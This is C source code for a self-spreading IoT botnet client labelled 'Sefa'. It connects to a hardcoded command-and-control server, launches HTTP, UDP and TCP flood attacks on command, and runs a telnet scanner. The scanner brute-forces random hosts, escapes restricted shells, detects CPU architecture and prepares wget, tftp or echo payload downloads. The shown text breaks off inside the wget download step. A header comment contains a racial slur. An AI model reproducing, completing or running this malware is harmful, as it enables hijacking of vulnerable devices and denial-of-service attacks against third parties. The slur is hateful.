// change the bot ipv4 wget and tftp on the scanner aswell as the connection port and ipv4
// to activate the scanner in the cnc: scanner on (username) (password)
// also hex all the dlr's and add them line 85 - 94
// Wicked Big Hacker Sefa Botnet - Crown Nigger

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <ctype.h>

#include "peer.h"
#include "crypt.h"
#include "commands.h"
#include "killer.h"

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SETUP_CONNECTION      0
#define CHECK_CONNECTION      1
#define USERNAME_PROMPT       2
#define SEND_USERNAME         3
#define PASSWORD_PROMPT       4
#define SEND_PASSWORD         5
#define CHECK_LOGIN           6
#define SEND_BUSYBOX          7
#define VERIFY_BUSYBOX        8
#define EXTRACT_ELF_HEADER    9
#define DETERMINE_ARCH        10
#define READ_PROC_CPUINFO     11
#define DETERMINE_ARM_SUBTYPE 12
#define FIND_WRITABLE         13
#define SEND_TFTP_WGET        14
#define UPLOAD_METHOD         15
#define DOWNLOAD_BINARY       16
#define PREPARE_ECHO          17
#define DROP_ECHO_DLR         18
#define EXECUTE_DLR           19
#define EXECUTE_FILE          20
#define CONFIRM_INFECTION     21

#define UPLOAD_WGET           1
#define UPLOAD_TFTP           2
#define UPLOAD_ECHO           3

#define MPSL_HEX_LINES        15
#define MIPS_HEX_LINES        15
#define ARM_HEX_LINES         9
#define ARM5_HEX_LINES        11
#define ARM6_HEX_LINES        11
#define ARM7_HEX_LINES        22
#define PPC_HEX_LINES         11
#define SPC_HEX_LINES         10
#define SH4_HEX_LINES         9
#define X86_HEX_LINES         9

char *all_responce_prmpt[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", 0};
char *fail_prompts[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", 0};
char *success_prompts[] = {"busybox", "$", "#", "shell", 0};
char *applet_responce[] = {"OFSTA: applet not found", 0};
char *any_prompt[] = {":", "#", "~", "@", 0};
char *login_prompts[] = {":", "sername", "ogin", "assword", 0};
char *elf_responce[] = {"ELF", 0};
char *writable_dirs[] = {"/", "/var/", "/var/run", "/dev/shm", "/dev/", "/var/tmp/", "/tmp/", 0};
char *wget_fail[] = {"wget: applet not found", 0};
char *tftp_fail[] = {"tftp: applet not found", 0};
char *successful_exec[] = {"Wicked Botnet v12", 0};

char *mpsl_dlr[] = {};
char *mips_dlr[] = {};
char *arm_dlr[] = {};
char *arm5_dlr[] = {};
char *arm6_dlr[] = {};
char *arm7_dlr[] = {};
char *ppc_dlr[] = {};
char *spc_dlr[] = {};
char *sh4_dlr[] = {};
char *x86_dlr[] = {};

peer_t server;
uint32_t *pids, x, y, z, w, scanPid;
uint64_t running_parents = 0;
int auth_size = 0, scanner_pid;
struct credentials *auth;

void shutdown_properly(int code);
int util_sock_print(int sock, char *string, ...);

void handle_signal_action(int sig_number)
{
  if (sig_number == SIGINT) {
    shutdown_properly(EXIT_SUCCESS);
  }
  else if (sig_number == SIGPIPE) {
    shutdown_properly(EXIT_SUCCESS);
  }
}

int setup_signals()
{
  struct sigaction sa;
  sa.sa_handler = handle_signal_action;
  if (sigaction(SIGINT, &sa, 0) != 0) {
    return -1;
  }
  if (sigaction(SIGPIPE, &sa, 0) != 0) {
    return -1;
  }

  return 0;
}

int get_client_name(int argc, char **argv, char *client_name)
{
  if (argc > 1)
    strcpy(client_name, argv[1]);
  else {
#ifdef WINDOWS
    strcpy(client_name, "windows");
#else
    strcpy(client_name, encryption_decode(7, NULL));
#endif
  }

  return 0;
}

int connect_cnc(peer_t *server)
{
  server->socket = socket(AF_INET, SOCK_STREAM, 0);
  if (server->socket < 0) {
    return -1;
  }

  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = INET_ADDR(213,183,48,185); // server's ipv4
  server_addr.sin_port = htons(40721); // bot port

  server->addres = server_addr;

  if (connect(server->socket, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) != 0) {
    return -1;
  }

#ifdef DEBUG
  printf("dbg: connected to cnc\n");
#endif

  return 0;
}

int build_fd_sets(peer_t *server, fd_set *read_fds, fd_set *write_fds, fd_set *except_fds)
{
  FD_ZERO(read_fds);
  FD_SET(STDIN_FILENO, read_fds);
  FD_SET(server->socket, read_fds);

  FD_ZERO(write_fds);

  if (server->send_buffer.current > 0)
    FD_SET(server->socket, write_fds);

  FD_ZERO(except_fds);
  FD_SET(STDIN_FILENO, except_fds);
  FD_SET(server->socket, except_fds);

  return 0;
}

void shutdown_properly(int code)
{
  delete_peer(&server);
#ifdef DEBUG
  printf("dbg: shutdown called\n");
#endif
  kill(killer_pid, 9);
  kill(scanner_pid, 9);
  kill(getpid(), 9);
  exit(code);
}

int read_socket_responce(int socket, unsigned char *buf, int bufsize)
{
  int select_tmp, current_retrys, count = 0;
  fd_set myset;
  struct timeval tv;
  tv.tv_sec = 30;
  tv.tv_usec = 0;
  memset(buf, 0, bufsize);
  FD_ZERO(&myset);
  FD_SET(socket, &myset);

  if((select_tmp = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
    while(current_retrys < 10)
    {
      if(util_sock_print(server.socket, "ping\n") < 0)
      {
          #ifdef DEBUG
              printf("dbg: lost connection\n");
          #endif
      }
      tv.tv_sec = 30;
      tv.tv_usec = 0;
      FD_ZERO(&myset);
      FD_SET(socket, &myset);

      if((select_tmp = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
        current_retrys++;
        continue;
      }
      break;
    }
  }

  unsigned char tmpchr, *cp;
  cp = buf;

  while(bufsize-- > 1)
  {
    if(recv(server.socket, &tmpchr, 1, 0) != 1) {
      *cp = 0x00;
      return -1;
    } *cp++ = tmpchr;

    if(tmpchr == '\n')
      break;
    count++;
  }
  *cp = 0x00;
  return count;
}

int get_fork()
{
  uint32_t parent, *newpids, i;
  parent = fork();

  if (parent <= 0)
    return parent;

  running_parents++;
  newpids = (uint32_t*)malloc((running_parents + 1) * 4);

  for (i = 0; i < running_parents - 1; i++)
    newpids[i] = pids[i];

  newpids[running_parents - 1] = parent;
  free(pids);
  pids = newpids;
  return parent;
}

char * strcasestr(const char *s, const char *find)
{
	char c, sc;
	size_t len;
	if ((c = *find++) != 0) {
		c = (char)tolower((unsigned char)c);
		len = strlen(find);
		do {
			do {
				if ((sc = *s++) == 0)
					return (NULL);
			} while ((char)tolower((unsigned char)sc) != c);
		} while (strncasecmp(s, find, len) != 0);
		s--;
	}
	return ((char *)s);
}
void scanner_init(char *username, char *password);

void do_action(int argc, unsigned char **argv)
{
  if(strstr(argv[0], encryption_decode(2, NULL))) {
    shutdown_properly(EXIT_SUCCESS);
    exit(0);
  }

  if(strstr(argv[0], "ping")) {
    util_sock_print(server.socket, "pong\n");
  }

  if(strstr(argv[0], "scanner")) {
    if(strstr(argv[1], "on")) {
      if(scanPid != 0)
        kill(scanPid, 9);

      uint32_t parent;
      parent = fork();

      if(parent > 0) {
        scanPid = parent;
        return;
      }
      else if(parent == -1)
        return;

      scanner_init(argv[2], argv[3]);
      _exit(0);
    }
  }

  if(strstr(argv[0], encryption_decode(5, NULL))) {
    if(argc < 5 || argc > 5)
			return;

    if(get_fork())
      return;

    ddos_flood_http(argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
    _exit(0);
  }

  if(strstr(argv[0], encryption_decode(4, NULL))) {
    if(argc < 4 || argc > 4)
			return;

    if(get_fork())
      return;

    ddos_flood_udp(argv[1], atoi(argv[2]), atoi(argv[3]));
    _exit(0);
  }

  if(strstr(argv[0], encryption_decode(6, NULL))) {
    if(argc < 4 || argc > 4)
			return;

    if(get_fork())
      return;

    ddos_flood_tcp(argv[1], atoi(argv[2]), atoi(argv[3]));
    _exit(0);
  }

  if(strstr(argv[0], encryption_decode(3, NULL))) {
    if(argc < 4 || argc > 4)
			return;

    if(get_fork())
      return;

    ddos_flood_std(argv[1], atoi(argv[2]), atoi(argv[3]));
    _exit(0);
  }
}

void process_recv_data(char *buf, int len) 
{
  int i = 0, c = 0, argc = 0;
  unsigned char *argv[10 + 1] = { 0 };


  char *token = strtok(buf, " ");

  while (token != NULL && argc < 10)
  {
      argv[argc++] = malloc(strlen(token) + 1);
      strcpy(argv[argc - 1], token);
      token = strtok(NULL, " ");
  }

  if(argc > 0)
      do_action(argc, argv);

  for (i = 0; i < argc; i++)
      free(argv[i]);
}

struct credentials {
  char *username, *password;
  int username_len, password_len, weight_min, weight_max;
};

void rand_init(void) {
  x = time(NULL);
  y = getpid() ^ getppid();
  z = clock();
  w = z ^ y;
}

uint32_t rand_next(void) {
  uint32_t t = x;
  t ^= t << 11;
  t ^= t >> 8;
  x = y; y = z; z = w;
  w ^= w >> 19;
  w ^= t;
  return w;
}

void rand_str(char *str, int len) {
  while (len > 0) {
    if (len >= 4) {
      *((uint32_t *)str) = rand_next();
      str += sizeof (uint32_t);
      len -= sizeof (uint32_t);
    }
    else if (len >= 2) {
      *((uint16_t *)str) = rand_next() & 0xFFFF;
      str += sizeof (uint16_t);
      len -= sizeof (uint16_t);
    }
    else {
      *str++ = rand_next() & 0xFF;
      len--;
    }
  }
}

void rand_alphastr(uint8_t *str, int len) {
  const char alphaset[] = "01010011010001010100011001000001";

  while (len > 0) {
    if (len >= sizeof (uint32_t)) {
      int i;
      uint32_t entropy = rand_next();

      for (i = 0; i < sizeof (uint32_t); i++) {
        uint8_t tmp = entropy & 0xff;
        entropy = entropy >> 8;
        tmp = tmp >> 3;
        *str++ = alphaset[tmp];
      }
      len -= sizeof (uint32_t);
    }
    else
    {
      *str++ = rand_next() % (sizeof (alphaset));
      len--;
    }
  }
}

ipv4_t get_random_ip(void) {
  uint8_t ip_state[4];

  do {
    ip_state[0] = rand_next() % 0xff;
    ip_state[1] = rand_next() % 0xff;
    ip_state[2] = rand_next() % 0xff;
    ip_state[3] = rand_next() % 0xff;
  }
  while(ip_state[0] == 0 || (ip_state[0] == 127));

  return INET_ADDR(ip_state[0],ip_state[1],ip_state[2],ip_state[3]);
}

void load_login(char *username, char *password, int i) {
  auth = realloc(auth, (auth_size + 1) * sizeof(struct credentials));

  auth[auth_size].username = username;
  auth[auth_size].username_len = strlen(username);
  auth[auth_size].password = password;
  auth[auth_size].password_len = strlen(password);
  auth[auth_size].weight_min = auth_size;
  auth[auth_size++].weight_max = auth_size + i;
  auth_size += i;
}

struct credentials *retrieve_login() {
  int i = 0;
  uint32_t rand = (uint32_t)(rand_next() % auth_size);

  for(i = 0; i < auth_size; i++) {
    if(rand < auth[i].weight_min)
      continue;
    else if(rand < auth[i].weight_max)
      return &auth[i];
  }
  return NULL;
}


int compare_strings(char *buffer, char **strings) {
  int i = 0;
  int num_of_strings = 0;

  for(num_of_strings = 0; strings[++num_of_strings] != 0;);

  for(i = 0; i < num_of_strings; i++) {
    if(strcasestr(buffer, strings[i])) {
      return 1;
    }
  }

  return 0;
}

int iac_negotiate(int sock, unsigned char *buf)
{
  unsigned char c;

  switch (buf[1]) {
  case CMD_IAC:
    return 0;
  case CMD_WILL:
  case CMD_WONT:
  case CMD_DO:
  case CMD_DONT:
    c = CMD_IAC;
    send(sock, &c, 1, MSG_NOSIGNAL);
    if (CMD_WONT == buf[1])
      c = CMD_DONT;
    else if (CMD_DONT == buf[1])
      c = CMD_WONT;
    else if (OPT_SGA == buf[1])
      c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
    else
      c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);

      send(sock, &c, 1, MSG_NOSIGNAL);
      send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
      break;

  default:
    break;
  }
  return 0;
}

int read_socket_buffer(int fd, int timeout_usec, unsigned char *buffer, int buffer_size, char **strings) {
  memset(buffer, 0, buffer_size);

  fd_set myset;
  struct timeval tv;

  tv.tv_sec = 9;
  tv.tv_usec = timeout_usec;

  FD_ZERO(&myset);
  FD_SET(fd, &myset);

  if(select(fd + 1, &myset, NULL, NULL, &tv) < 1)
    return 0;

  recv(fd, buffer, buffer_size, 0);

  if(buffer[0] == 0xFF) {
    iac_negotiate(fd, buffer);
  }

  if(compare_strings(buffer, strings)) {
    return 1;
  }

  return 0;
}

struct telnet_state_t {
  int fd, login_attempts;
  uint32_t ip;
  uint8_t complete, state, endianness, upload_method;
  uint32_t total_timeout, machine;
  char sock_buffer[1024], arch[32];
  struct credentials *auth;
};

static void check_timeout(struct telnet_state_t *fd, uint16_t timeout) {
  uint32_t now = time(NULL);
  char ret = fd->total_timeout + timeout < now ? 1 : 0;

  if(ret) {
    close(fd->fd);
    fd->complete = 1;
    fd->total_timeout = 0;
    fd->state = SETUP_CONNECTION;
  }
  return;
}

void sc_change_state(struct telnet_state_t *telnet_state, int new_state) {
  telnet_state->total_timeout = time(NULL);
  memset(telnet_state->sock_buffer, 0, 1024);
  telnet_state->state = new_state;
}

int util_sock_print(int sock, char *string, ...) {
  char buffer[1024];
  memset(buffer, 0, 1024);

  va_list args;
  va_start(args, string);
  vsprintf(buffer, string, args);
  va_end(args);

  return send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
}

static int parse_elf_response(struct telnet_state_t *fd)
{
  int i = 0, elf_start_pos = 0;
  char *elf_magic = "\x7f\x45\x4c\x46";

  for(i = 0; i < 1024; i++) 
  {
    if(fd->sock_buffer[i] == elf_magic[elf_start_pos]) 
	{
      if(++elf_start_pos == 4)
	  {
        elf_start_pos = i;
        break;
      }
    }
    else
    {
      elf_start_pos = 0;
    }
  }

  if(elf_start_pos == 0)
    return 0;

  fd->endianness = fd->sock_buffer[elf_start_pos + 0x02];
  fd->machine = fd->sock_buffer[elf_start_pos + 0xF];

  if(fd->machine == EM_NONE)
    return 0;

  switch(fd->machine)
  {
	case EM_ARM:
	  strcpy(fd->arch, "arm"); // get subtype later
	case EM_SPARC:
	  strcpy(fd->arch, "spc");
	case EM_386:
	  strcpy(fd->arch, "x86");
	case EM_PPC:
	  strcpy(fd->arch, "ppc");
	case EM_ARC:
	  strcpy(fd->arch, "arc");
	case EM_SH:
	  strcpy(fd->arch, "sh4");
	case EM_X86_64:
	  strcpy(fd->arch, "x86");
	case EM_MIPS:
	  switch(fd->endianness)
	  {
		case ENDIAN_LITTLE:
		  strcpy(fd->arch, "mpsl");
		case ENDIAN_BIG:
		  strcpy(fd->arch, "mips");
		default:
		   break;
	  }
	  default:
		break;
  }
  
  if(strlen(fd->arch) != 0)
    return 1;
  else
	return 0; 
}

int consume_arm_subtype(struct telnet_state_t *fd)
{
  char *detect_arm7[] = {"ARMv7", "arm7", "armv7", "v7l", 0};
  char *detect_arm6[] = {"ARMv6", "arm6", "armv6", "v6l", 0};
  char *detect_arm5[] = {"ARMv5", "arm5", "armv5", "v5te", 0};

  if(compare_strings(fd->sock_buffer, detect_arm7))
    memcpy(fd->arch, "arm7", 4);
	else if(compare_strings(fd->sock_buffer, detect_arm6))
    memcpy(fd->arch, "arm6", 4);
	else if(compare_strings(fd->sock_buffer, detect_arm5))
    memcpy(fd->arch, "arm5", 4);

  return 1;
}

void scanner_init(char *username, char *password)
{
    fd_set write_set;
    struct timeval timeout;
    socklen_t lon;

    char payload_buf[2048];
    int valopt = 0, max_fds = 0, cpu_cores = sysconf(_SC_NPROCESSORS_ONLN), res = 0, i = 0, num_writable_dirs = 6, j = 0;

    rand_init();

    if(cpu_cores == 1)
        max_fds = 500;
    else if(cpu_cores > 1)
        max_fds = 1000;
    else
        exit(1);

    struct sockaddr_in dest_addr;
    struct telnet_state_t fds[max_fds];

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    memset(fds, 0, max_fds * (sizeof(int) + 1));

    for(i = 0; i < max_fds; i++)
    {
        memset(&(fds[i]), 0, sizeof(struct telnet_state_t));
        fds[i].complete = 1;
        sc_change_state(&fds[i], SETUP_CONNECTION);
        fds[i].login_attempts = 0;
    }

    // peer.h to least
    load_login(username, password, 100);

    #ifdef DEBUG
        printf("dbg: scanner started with %d fds\n", max_fds);
    #endif
	
    if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96mScanner started with %d fds\r\n", max_fds) < 0)
    {
        exit(1);
    }

    while(1)
    {
        for(i = 0; i < max_fds; i++)
        {
            if(fds[i].total_timeout == 0)
            {
                fds[i].total_timeout = time(NULL);
            }
            switch(fds[i].state)
            {
                case SETUP_CONNECTION:
                {
                    if(fds[i].complete == 1)
                    {
                        memset(&(fds[i]), 0, sizeof(struct telnet_state_t));
                        fds[i].ip = get_random_ip();
                    }

                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;

                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    if(fds[i].fd == -1)
                        continue;

                    fcntl(fds[i].fd, F_SETFL, O_NONBLOCK | fcntl(fds[i].fd, F_GETFL, 0));

                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                    {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        continue;
                    }

                    fds[i].total_timeout = 0;

                    if(fds[i].complete != 2)
                        fds[i].auth = retrieve_login();

                    fds[i].state = CHECK_CONNECTION;
                }
                break;

                case CHECK_CONNECTION:
                {
                    FD_ZERO(&write_set);
                    FD_SET(fds[i].fd, &write_set);

                    timeout.tv_sec = 0;
                    timeout.tv_usec = 100;

                    res = select(fds[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(res == 1)
                    {
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &lon);
                        if(valopt)
                        {
                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                        }
                        else
                        {
                            fds[i].total_timeout = 0;
                            fds[i].state = USERNAME_PROMPT;
                        }
                        continue;
                    }
                    else if(res == -1)
                    {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        fds[i].state = SETUP_CONNECTION;
                    }

                    if(fds[i].total_timeout + 5 < time(NULL))
                    {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        fds[i].state = SETUP_CONNECTION;
                    }
                }
                break;

                case USERNAME_PROMPT:
                {
                    if(read_socket_buffer(fds[i].fd, 30, fds[i].sock_buffer, 1024, login_prompts) || read_socket_buffer(fds[i].fd, 30, fds[i].sock_buffer, 1024, any_prompt))
                    {
                        if(compare_strings(fds[i].sock_buffer, login_prompts) || compare_strings(fds[i].sock_buffer, any_prompt))
                            sc_change_state(&fds[i], SEND_USERNAME);
                        else {
                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                            continue;
                        }

                        continue;
                    }
                    check_timeout(&fds[i], 5);
                }
                break;

                case SEND_USERNAME:
                {
                    #ifdef DEBUG
                        printf("scanner: attempt %d.%d.%d.%d:23 %s:%s\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].auth->username, fds[i].auth->password);
                    #endif

                    if(util_sock_print(fds[i].fd, "%s\r\n", fds[i].auth->username) < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    sc_change_state(&fds[i], PASSWORD_PROMPT);
                }
                break;

                case PASSWORD_PROMPT:
                {
                    if(read_socket_buffer(fds[i].fd, 30, fds[i].sock_buffer, 1024, login_prompts) || read_socket_buffer(fds[i].fd, 30, fds[i].sock_buffer, 1024, any_prompt))
                    {
                        if(compare_strings(fds[i].sock_buffer, login_prompts) || compare_strings(fds[i].sock_buffer, any_prompt))
                            sc_change_state(&fds[i], SEND_PASSWORD);
                        else {
                          close(fds[i].fd);
                          fds[i].complete = 1;
                          fds[i].total_timeout = 0;
                          fds[i].state = SETUP_CONNECTION;
                          continue;
                        }

                        continue;
                    }

                    check_timeout(&fds[i], 5);
                }
                break;

                case SEND_PASSWORD:
                {
                    if(util_sock_print(fds[i].fd, "%s\r\n", fds[i].auth->password) < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    sc_change_state(&fds[i], CHECK_LOGIN);
                }
                break;

                case CHECK_LOGIN:
                {
                    if(read_socket_buffer(fds[i].fd, 10, fds[i].sock_buffer, 1024, all_responce_prmpt))
                    {
                        if(compare_strings(fds[i].sock_buffer, fail_prompts))
                        {
                            #ifdef DEBUG
                                printf("dbg: scanner failed attempt #%d\n", fds[i].login_attempts);
                            #endif

                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                        }
                        else if(compare_strings(fds[i].sock_buffer, success_prompts))
                        {
                            #ifdef DEBUG
                                printf("dbg: scanner successful attempt\n");
                            #endif

                            if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96mBruteforce successful %d.%d.%d.%d:23 %s:%s\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].auth->username, fds[i].auth->password) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            if(util_sock_print(fds[i].fd, "linuxshell\r\n") < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            if(util_sock_print(fds[i].fd, "..\r\n") < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            if(util_sock_print(fds[i].fd, "sh\r\n") < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            if(util_sock_print(fds[i].fd, "shell\r\n") < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            if(util_sock_print(fds[i].fd, "enable\r\n") < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            if(util_sock_print(fds[i].fd, "system\r\n") < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            sc_change_state(&fds[i], SEND_BUSYBOX);
                        }
                        else
                        {
                            #ifdef DEBUG
                                printf("dbg: scanner successful attempt\n");
                            #endif

                            sc_change_state(&fds[i], SEND_BUSYBOX);
                        }
                        continue;
                    }
                    check_timeout(&fds[i], 45);
                }
                break;

                case SEND_BUSYBOX:
                {
                    if(util_sock_print(fds[i].fd, "/bin/busybox %s\r\n", "OFSTA") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    sc_change_state(&fds[i], VERIFY_BUSYBOX);
                }
                break;

                case VERIFY_BUSYBOX:
                {
                  if(read_socket_buffer(fds[i].fd, 10, fds[i].sock_buffer, 1024, applet_responce))
                  {
                      if(compare_strings(fds[i].sock_buffer, applet_responce))
                          sc_change_state(&fds[i], EXTRACT_ELF_HEADER);
                      else 
					  {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        fds[i].state = SETUP_CONNECTION;
                        continue;
                      }

                      continue;
                  }

                  check_timeout(&fds[i], 60);
                }
                break;

                case EXTRACT_ELF_HEADER:
                {
                    if(util_sock_print(fds[i].fd, "/bin/busybox cat /bin/echo\r\n") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    sc_change_state(&fds[i], DETERMINE_ARCH);
                }
                break;

                case DETERMINE_ARCH:
                {
                    if(read_socket_buffer(fds[i].fd, 20, fds[i].sock_buffer, 1024, elf_responce))
                    {
                        int consumed = parse_elf_response(&fds[i]);
						
						if(!consumed)
                        {
                          close(fds[i].fd);
                          fds[i].complete = 1;
                          fds[i].total_timeout = 0;
                          fds[i].state = SETUP_CONNECTION;
                          continue;
                        }
                        else
                        {
                            if(strcmp(fds[i].arch, "arm") == 0)
                                sc_change_state(&fds[i], READ_PROC_CPUINFO);
                            else
                                sc_change_state(&fds[i], FIND_WRITABLE);
                        }

                        continue;
                    }

                  check_timeout(&fds[i], 120);
                }
                break;

                case READ_PROC_CPUINFO:
                {
                    if(util_sock_print(fds[i].fd, "/bin/busybox cat /proc/cpuinfo; /bin/busybox OFSTA\r\n") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    sc_change_state(&fds[i], DETERMINE_ARM_SUBTYPE);
                }
                break;

                case DETERMINE_ARM_SUBTYPE:
                {
                    if(read_socket_buffer(fds[i].fd, 20, fds[i].sock_buffer, 1024, applet_responce))
                    {
                        int ret = consume_arm_subtype(&fds[i]);

                        if(ret)
                            sc_change_state(&fds[i], FIND_WRITABLE);
                        else {
                          close(fds[i].fd);
                          fds[i].complete = 1;
                          fds[i].total_timeout = 0;
                          fds[i].state = SETUP_CONNECTION;
                          continue;
                        }

                        continue;
                    }

                    check_timeout(&fds[i], 120);
                }
                break;

                case FIND_WRITABLE:
                {
                    #ifdef DEBUG
                        printf("dbg: scanner arch is %s\n", fds[i].arch);
                    #endif

                    if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96mRead ELF header for %d.%d.%d.%d:23 %s:%s (%s)\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].auth->username, fds[i].auth->password, fds[i].arch) < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    for(j = 0; j < 7; j++)
                    {
                        if(util_sock_print(fds[i].fd, ">%s.sefa && cd %s; >EfJinSton\r\n", writable_dirs[j], writable_dirs[j]) < 0)
                        {
                          close(fds[i].fd);
                          fds[i].complete = 1;
                          fds[i].total_timeout = 0;
                          fds[i].state = SETUP_CONNECTION;
                          continue;
                        }
                    }

                    sc_change_state(&fds[i], SEND_TFTP_WGET);
                }
                break;

                case SEND_TFTP_WGET:
                {
                    if(util_sock_print(fds[i].fd, "/bin/busybox wget; /bin/busybox tftp; /bin/busybox OFSTA\r\n") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    #ifdef DEBUG
                        printf("dbg: attempting to extract upload_method\n");
                    #endif

                    sc_change_state(&fds[i], UPLOAD_METHOD);
                }
                break;

                case UPLOAD_METHOD:
                {
                    if(read_socket_buffer(fds[i].fd, 20, fds[i].sock_buffer, 1024, applet_responce))
                    {
                        int can_tftp = 0, can_wget = 0;
                        if(compare_strings(fds[i].sock_buffer, tftp_fail))
                            can_tftp = 0;
                        else
                            can_tftp = 1;

                        if(compare_strings(fds[i].sock_buffer, wget_fail))
                            can_wget = 0;
                        else
                            can_wget = 1;

                        if(can_wget == 1 && can_tftp == 1)
                            can_tftp = 0;

                        if(can_wget == 1)
                            fds[i].upload_method = UPLOAD_WGET;
                        else if(can_tftp == 1)
                            fds[i].upload_method = UPLOAD_TFTP;
                        else
                            fds[i].upload_method = UPLOAD_ECHO;

                        #ifdef DEBUG
                            printf("dbg: upload method is %d\n", fds[i].upload_method);
                        #endif

                        sc_change_state(&fds[i], DOWNLOAD_BINARY);
                        continue;
                    }

                    check_timeout(&fds[i], 60);
                }
                break;

                case DOWNLOAD_BINARY:
                {
                    switch(fds[i].upload_method)
                    {
                        case UPLOAD_WGET:
                        {
                          if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96m%d.%d.%d.%d:23 %s:%s (%s) is using WGET\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].auth->username, fds[i].auth->password, fds[i].arch) < 0)
                          {
                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                            continue;
                          }
